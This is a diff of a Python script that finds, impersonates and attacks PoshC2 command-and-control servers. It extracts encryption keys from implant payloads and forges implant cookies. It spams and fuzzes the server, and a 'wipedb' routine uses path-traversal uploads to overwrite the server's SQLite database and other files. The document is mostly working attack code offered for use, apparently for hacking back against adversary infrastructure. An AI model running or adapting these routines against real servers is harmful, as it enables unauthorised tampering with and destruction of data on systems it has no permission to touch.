@@ -1,12 +1,14 @@
 #!/usr/bin/env python
 # Find, monitor and troll a PoshC2 server
 
-import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, magic, base64
+import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64
 
 class PoshC2Payload:
   
   filepath = None
   useragent = None
+  secondstage = None
+  encryptionkey = None
 
   def __init__( self, path ):
     if not os.path.isfile( path ):
@@ -15,21 +17,13 @@ class PoshC2Payload:
     self.filepath = path
 
   # Attempt to pull info out of implant payload
-  def analyse( self, connect=False ):
-    print self.filepath
+  def analyse( self ):
+    print 'Analysing ' + self.filepath + '...'
 
-    # Get type of file
-    with magic.Magic() as m:
-      info = m.id_buffer( self.filepath )
-    
-    # Get file contents and attempt to find where second stage URL is
-    if 'ASCII' in info:
-      
-      # ASCII text
-      with open( self.filepath, 'r' ) as f:
-        decoded = PoshC2Payload.base64_walk( f.read() )
+    with open( self.filepath, 'rb' ) as f:
+      decoded = PoshC2Payload.base64_walk( f.read() )
   
-    print decoded
+    # print decoded
 
     # Get custom headers
     headernames = [
@@ -62,15 +56,9 @@ class PoshC2Payload:
       self.encryptionkey = m.group(1)
       print 'Encryption key: ' + self.encryptionkey
 
-    # Connect to the C2 as a new implant
-    if connect:
-      c2 = PoshC2Server()
-      c2.key = self.encryptionkey
-      c2.username = raw_input('Username:').strip()
-      c2.domain = raw_input('Domain:').strip()
-      c2.machine = raw_input('Machine:').strip()
-      c2.secondstage( self.secondstage, interact=True )
-    
+    c2 = PoshC2Server()
+    c2.key = self.encryptionkey
+    return c2
 
   # Recursively attempt to extract and decode base64
   @staticmethod
@@ -158,16 +146,12 @@ class PoshC2Server:
       cookies['SessionID'] = self.cookie
       print 'Including cookies'
       print self.cookie
-    method = 'GET'
 
     try:
-      if method == 'POST':
-        response = self.session.post(url, data=data, headers=headers, verify=False, files=files, stream=stream )
-      elif method == 'GET':
-        if data:
-          response = self.session.get(url, params=data, headers=headers, verify=False )
-        else:
-          response = self.session.get(url, headers=headers, verify=False )
+      if data:
+        response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )
+      else:
+        response = self.session.get(url, headers=headers, verify=False )
     except:
       e = sys.exc_info()[1]
       print 'Request failed: ' + str( e ), 'fail' 
@@ -189,7 +173,7 @@ class PoshC2Server:
     return aes
 
   # Encrypt a string and base64 encode it
-  def encrypt( self, data ):
+  def encrypt( self, data, gzip=False ):
     # function ENC ($key,$un){
     # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
     # $a = CAM $key
@@ -199,40 +183,61 @@ class PoshC2Server:
     # [System.Convert]::ToBase64String($p)
     # }
 
+    if gzip:
+      print 'Gzipping data - pre-zipped len, ' + str(len(data))
+      import StringIO
+      import gzip
+      out = StringIO.StringIO()
+      with gzip.GzipFile(fileobj=out, mode="w") as f:
+        f.write(data)
+      data = out.getvalue() 
+
     # Pad with zeros
-   
     mod = len(data) % 16
     if mod != 0:
       newlen = len(data) + (16-mod)
       data = data.ljust( newlen, '\0' )
     aes = self.get_encryption()
-    return base64.b64encode( aes.encrypt( data ) )
+    # print 'Data len: ' + str(len(data))
+    data = aes.IV + aes.encrypt( data )
+    if not gzip:
+      data = base64.b64encode( data )
+    return data
 
   # Decrypt a string from base64 encoding 
-  def decrypt( self, data ):
+  def decrypt( self, data, gzip=False ):
     # iv is first 16 bytes of cipher
     iv = data[0:16]
+    # data = data[16:]
+    # print 'IV length: ' + str(len(iv))
     aes = self.get_encryption(iv)
-    return aes.decrypt(base64.b64decode(data))
-
-  def setcookie( self ):
+    if not gzip:
+      data = base64.b64decode(data)
+    data =  aes.decrypt( data )
+    if gzip:
+      print 'Gunzipping data - pre-zipped len, ' + str(len(data))
+      import StringIO
+      import gzip
+      infile = StringIO.StringIO(data)
+      with gzip.GzipFile(fileobj=infile, mode="r") as f:
+        data = f.read()
+    return data
+  
+  def setcookie( self, value=None ):
+    if value:
+      c = value
+    else:
     # $o="$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221"
-    #     asdf\asdf         ;asdf;asdf             ;AMD64                      ;614 ;http://172.16.88.221:80
-    # [19]: Seen:01/23/2018 16:33:43 | PID:http://172.16.88.221:80 | Sleep:5 |  @ AMD64 (4236)
-    # [20]: Seen:01/23/2018 16:34:49 | PID:4208 | Sleep:5 | DESKTOP-S4K8P4H\user @ DESKTOP-S4K8P4H (AMD64)
-    # $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)
-    if not self.pid:
-      import random
-      self.pid = random.randrange(300,9999)
-    c = self.domain + '\\\\' 
-    c += self.username + ';'
-    c += self.username + ';;' 
-    c += self.machine + ';AMD64;' 
-    c += str( self.pid ) + ';' 
-    c += self.host
+      if not self.pid:
+        import random
+        self.pid = random.randrange(300,9999)
+      c = self.domain + '\\'
+      c += self.username + ';'
+      c += self.username + ';' 
+      c += self.machine + ';AMD64;' 
+      c += str( self.pid ) + ';' 
+      c += self.host
     print c
-    # c = 'blorebank\\\\iain;iain;;BLORELAPTOP;AMD64;1234;http://whatever'
-    # print c
     self.cookie = 'SessionId=' + self.encrypt( c )
     print self.cookie
 
@@ -257,7 +262,7 @@ class PoshC2Server:
     m = re.search(r'\$Server *= *"([^"]+)"', data )
     if m:
       print 'Comms URL: ' + m.group(1)
-      commsurl = m.group(1)
+      self.commsurl = m.group(1)
     m = re.search(r'\$sleeptime *= *([0-9]+)', data )
     if m:
       print 'Sleep time: ' + m.group(1)
@@ -265,90 +270,62 @@ class PoshC2Server:
 
     if not interact: return True
     
-    self.listen( commsurl )
-  
-  # function GetImgData($cmdoutput) {
-  #     $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
-  #     
-  #     try {$image = $icoimage|get-random}catch{}
-  # 
-  #     function randomgen 
-  #     {
-  #         param (
-  #             [int]$Length
-  #         )
-  #         $set = "...................@..........................Tyscf".ToCharArray()
-  #         $result = ""
-  #         for ($x = 0; $x -lt $Length; $x++) 
-  #         {$result += $set | Get-Random}
-  #         return $result
-  #     }
-  #     $imageBytes = [Convert]::FromBase64String($image)
-  #     $maxbyteslen = 1500
-  #     $maxdatalen = 1500 + ($cmdoutput.Length)
-  #     $imagebyteslen = $imageBytes.Length
-  #     $paddingbyteslen = $maxbyteslen - $imagebyteslen
-  #     $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
-  #     $ImageBytesFull = New-Object byte[] $maxdatalen    
-  #     [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
-  #     [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
-  #     [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
-  #     $ImageBytesFull
-  # }
+    self.listen( self.commsurl )
 
-  # function Download-File
-  # {
-  #     param
-  #     (
-  #         [string] $Source
-  #     )
-  #     try {
-  #         $fileName = Resolve-PathSafe $Source
-  #         $randomName = Get-RandomName -Length 5
-  #         $fileExt = [System.IO.Path]::GetExtension($fileName)
-  #         $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
-  #         $fullNewname = "$($fileNameOnly)_$($randomName)$($fileExt)"
+  def getimgdata( self, data ):
+    # Just use one image because we don't care
+    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     
+    maxbyteslen = 1500
+    maxdatalen = 1500 + len( data )
+    imagebyteslen = len(imagebytes)
+    paddingbyteslen = maxbyteslen - imagebyteslen
+    bytepadding = '.'.ljust(paddingbyteslen,'.')
+    imagebytesfull = imagebytes + bytepadding + data
+    return imagebytesfull
+
+  def uploadfile( self, localpath, remotepath, data=None ):
+    c = 'download-file '+remotepath
+    self.setcookie(c)
+    if data:
+      filedata = data
+    else:
+      with open( localpath, 'rb' ) as f:
+        filedata = f.read()
+
   #         $bufferSize = 10737418;
-  # 
-  #         $fs = [System.IO.File]::Open($fileName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite);        
-  #         $fileSize =(Get-Item $fileName).Length
-  #         
-  #         $chunkSize = $fileSize / $bufferSize
-  #         $totalChunks = [int][Math]::Ceiling($chunkSize)
-  #         if ($totalChunks -lt 1) {$totalChunks = 1}
-  #         $totalChunkStr = $totalChunks.ToString("00000")
-  #         $totalChunkByte = [System.Text.Encoding]::UTF8.GetBytes($totalChunkStr)
-  #         $Chunk = 1
-  #         $finfo = new-object System.IO.FileInfo ($fileName)
-  #         $size = $finfo.Length
-  #         $str = New-Object System.IO.BinaryReader($fs);
-  #         do {
-  #             $ChunkStr = $Chunk.ToString("00000")
-  #             $ChunkedByte = [System.Text.Encoding]::UTF8.GetBytes($ChunkStr)
-  #             $preNumbers = New-Object byte[] 10
   #             $preNumbers = ($ChunkedByte+$totalChunkByte)
-  #             $readSize = $bufferSize;
-  #             $chunkBytes = $str.ReadBytes($readSize);
-  #             $ReadCommand = "download-file "+$fullNewname
-  #             $ReadCommand = Encrypt-String $key $ReadCommand
   #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
-  #             $UploadBytes = getimgdata $send
-  #             (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
-  #             ++$Chunk 
-  #         } until (($size -= $bufferSize) -le 0);
-  #     } catch {
-  #         $Output = "ErrorCmd: " + $error[0]
-  #         $ReadCommand = "Error downloading file "+$fullnewname
-  #         $ReadCommand = Encrypt-String $key $ReadCommand  
-  #         $send = Encrypt-String2 $key $output
-  #         $UploadBytes = getimgdata $send
-  #         (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
-  #     } 
-  # }
+    buffersize = 10737418
+    filesize = len( filedata )
+    chunksize = filesize / buffersize
+    import math
+    totalchunks = int(math.ceil(chunksize))
+    if totalchunks < 1: totalchunks = 1
+    totalchunkstr = str( totalchunks ).rjust(5,'0')
+    chunk = 1
+    start = 0
+    while chunk <= totalchunks:
+      chunkstr = str( chunk ).rjust(5,'0')
+      prenumbers=chunkstr + totalchunkstr
+      chunkdata = filedata[start:start+buffersize]
+      chunk+=1
+      start += buffersize
+      send = self.encrypt( prenumbers + chunkdata, gzip=True )
+      uploadbytes = self.getimgdata( send )
+      print 'Chunk data: ' + chunkdata
+      print 'Prenumbers: ' + prenumbers
+      print 'Imgdata: ' + uploadbytes
+      response = self.do_request( self.commsurl, uploadbytes )
+      print response
+      if len(response.strip()) > 0:
+        print self.decrypt( response )
+    return False  
 
-  def uploadfile( self, localpath, remotepath ):
-    
-
+  def wipedb( self ):
+    print 'Wiping their DB...'
+    self.uploadfile( None, '..\PowershellC2.SQLite', 'Appended data' )
+    self.uploadfile( None, '..\oops.txt', 'oopsy' )
+    self.uploadfile( None, '..\Restart-C2Server.lnk', 'oopsy' )
 
   # Listen to incoming commands
   def listen( self, url ):
@@ -362,13 +339,16 @@ class PoshC2Server:
     return False
 
   # rickroll the server
-  def rickroll( self, username=None, domain=None ):
+  def rickroll( self, url ):
     thisdir = os.path.dirname(os.path.realpath(__file__))
     wordsfile = thisdir + '/nevergonna.txt'
-    self.spam( wordsfile, username, domain )
-
+    self.username = 'rastley'
+    self.domain = 'SAW'
+    self.host = 'https://bitly.com/98K8eH'
+    self.spam( wordsfile, url )
+ 
   # Spray the contents of a txt file at the server as machine names
-  def spam( self, wordsfile, username=None, domain=None ):
+  def spam( self, wordsfile, url ):
     try:
       with open( wordsfile, 'r' ) as f:
         lines = f.readlines()
@@ -377,33 +357,46 @@ class PoshC2Server:
       return False
 
     for line in lines:
-      self.connect( username, domain, line )
-      time.sleep( 1 )
-
+      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')
+      self.machine = line
+      key = self.key
+      self.secondstage( url )
+      self.pid = None
+      self.key = key
     return True
+  
+  # Connect with random keys, forever
+  def fuzz( self, secondstage ):
+    import random
+    while True:
+      c = b''
+      for i in range( 0, 16 ):
+        c += unichr( random.randint(0, 127 ) )
+      self.key = base64.b64encode( c )
+      self.secondstage( secondstage )
+
         
 
 def main():
   
   # Command line options
   parser = argparse.ArgumentParser(description="Find, monitor and troll a PoshC2 server")
+  parser.add_argument("-a", "--analyse", help="Analyse an implant payload to discover C2 server")
   parser.add_argument("-k", "--key", help="Comms encryption key" )
   parser.add_argument("-U", "--useragent", help="User-agent string" )
   parser.add_argument("-r", "--referer", help="Referer string" )
   parser.add_argument("-H", "--host", help="Host name to connect to" )
   parser.add_argument("-g", "--hostheader", help="Host header for domain fronted servers")
-  parser.add_argument("-d", "--domain", help="Windows domain name to claim to be in")
-  parser.add_argument("-u", "--user", help="Windows user to claim to be connecting as")
-  parser.add_argument("-m", "--machine", help="Machine hostname to claim to be connecting as")
-  parser.add_argument("-a", "--analyse", help="Analyse an implant payload to discover C2 server")
-  parser.add_argument("--connect", action='store_true', help="Connect to the C2 as a new implant if analysis worked")
-
-  parser.add_argument("-s", "--secondstage", help="Attempt to download second stage string and discover comms URL and key")
-  parser.add_argument("--scan", help="Scan an IP address range for servers")
+  parser.add_argument("-d", "--domain", default='WORKGROUP', help="Windows domain name to claim to be in")
+  parser.add_argument("-u", "--user", default='user', help="Windows user to claim to be connecting as")
+  parser.add_argument("-m", "--machine", default='DESKTOP', help="Machine hostname to claim to be connecting as")
+  parser.add_argument("--connect", action='store_true', help="Connect to the C2 as a new implant then quit")
   parser.add_argument("--watch", action='store_true', help="Connect and monitor commands as they come in")
+
   parser.add_argument("--spam", metavar="TEXTFILE", help="Spam the connected implants screen with content from this text file")
   parser.add_argument("--rickroll", action='store_true', help="Spam with the entire lyrics to Never Gonna Give You Up")
-  parser.add_argument("--debug", help="Output search commands")
+  parser.add_argument("--upload", nargs=2, help="Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)")
+  parser.add_argument("--fuzz", action='store_true', help="Fuzz with random bytes")
   if len( sys.argv)==1:
     parser.print_help()
     sys.exit(1)
@@ -411,28 +404,36 @@ def main():
 
   if args.analyse:
     payload = PoshC2Payload( args.analyse )   
-    payload.analyse( args.connect )
-    return True
-
-  
-  c2 = PoshC2Server()
-  c2.useragent = args.useragent
-  c2.referer = args.referer
-  c2.key = args.key
+    c2 = payload.analyse()
+    secondstage = payload.secondstage
+  else:
+    c2 = PoshC2Server()
+    c2.useragent = args.useragent
+    c2.referer = args.referer
+    c2.key = args.key
+    c2.host = args.host
   c2.domain = args.domain
   c2.username = args.user
   c2.machine = args.machine
-  c2.host = args.host
 
+  if args.connect:
+    c2.secondstage( secondstage )
+    return True
 
-  if args.secondstage:
-    if not args.key: 
-      print 'Print encryption key required'
-      return False
-    if not args.useragent:
-      args.useragent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko'
+  if args.watch:
+    c2.secondstage( secondstage, interact=True )
+    return True
 
-    c2.secondstage( args.secondstage )
+  if args.rickroll:
+    c2.rickroll( payload.secondstage )
+    return True
+
+  if args.upload:
+    c2.secondstage( secondstage )
+    c2.uploadfile( args.upload[0], args.upload[1] ) 
+
+  if args.fuzz:
+    c2.fuzz( secondstage )
 
 if __name__ == "__main__":
   main()
